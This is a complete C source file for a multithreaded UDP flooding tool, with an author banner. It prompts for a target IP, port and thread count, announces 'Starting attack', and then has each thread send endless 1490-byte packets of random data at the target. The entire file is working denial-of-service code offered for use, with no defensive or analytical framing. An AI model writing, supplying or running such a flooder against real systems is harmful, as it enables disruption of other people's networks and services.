#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <time.h>
#include <pthread.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

typedef struct {
    char ip[256];
    int port;
    int thread_id;
    long sent_count;
} thread_args_t;

void* send_packets(void *arg) {
    unsigned char bytes[1490]; 
    thread_args_t *args = (thread_args_t *)arg;
    srand(time(NULL) + args->thread_id);
    int sock;
    struct sockaddr_in server_addr;
    int current_port = args->port;
    
    sock = socket(AF_INET, SOCK_DGRAM, 0);
    if (sock < 0) {
        perror("sock < 0");
        pthread_exit(NULL);
    }
    
    memset(&server_addr, 0, sizeof(server_addr));
    server_addr.sin_family = AF_INET;
    server_addr.sin_addr.s_addr = inet_addr(args->ip);
    

    while (1) {
        server_addr.sin_port = htons(current_port);
        for (int i = 0; i < 1490; i++) {
            bytes[i] = (unsigned char)(rand() % 256);
        }
        if (sendto(sock, bytes, 1490, 0, 
                   (struct sockaddr *)&server_addr, 
                   sizeof(server_addr)) < 0) {
            perror("sendto(sock, bytes, 1490, 0, ...) < 0");
        }
        
        args->sent_count++;
        if (args->sent_count % 1000 == 0) {
            printf("[Thread %d] Sent %ld packets to %s through port:%d\n", args->thread_id, args->sent_count, args->ip, current_port);
        }
        usleep(1000); 
    }
    
    close(sock);
    pthread_exit(NULL);
}

int main() {
    unsigned char bytes[1490];
    pthread_t threads[10];
    thread_args_t thread_args[10];
    char ip[256];
    char port_str[256];
    int port;
    int num_threads;
    long sent_count = 0;
    pthread_mutex_t mutex = PTHREAD_MUTEX_INITIALIZER;
    system("clear");
    printf("\n");
    printf("Author   : bytecategory\n");
    printf("Github   : https://github.com/bytecategory\n");
    printf("Telegram     : https://t.me/bytecategory\n");
    printf("\n");
    
    printf("IP Target : ");
    fgets(ip, sizeof(ip), stdin);

    size_t len = strlen(ip);
    if (len > 0 && ip[len - 1] == '\n') {
        ip[len - 1] = '\0';
    }
    
    printf("Port       : ");
    fgets(port_str, sizeof(port_str), stdin);
    port = atoi(port_str);
    
    printf("Number of threads (1-10): ");
    char threads_str[256];
    fgets(threads_str, sizeof(threads_str), stdin);
    num_threads = atoi(threads_str);
    
    if (num_threads < 1 || num_threads > 10) {
        printf("Invalid thread count. Using 1 threads.\n");
        num_threads = 1;
    }
    
    system("clear");
    printf("\nStarting attack with %d threads...\n\n", num_threads);
    
    for (int i = 0; i < num_threads; i++) {
        thread_args[i].thread_id = i + 1;
        strcpy(thread_args[i].ip, ip);
        thread_args[i].port = port;

        thread_args[i].sent_count = 0;
        
        if (pthread_create(&threads[i], NULL, send_packets, &thread_args[i]) != 0) {
            perror("pthread_create(&threads[i], NULL, send_packets,...) != 0");
            exit(1);
        }
    }
    for (int i = 0; i < num_threads; i++) {
        pthread_join(threads[i], NULL);
    }
    
    pthread_mutex_destroy(&mutex);
    return 0;
}

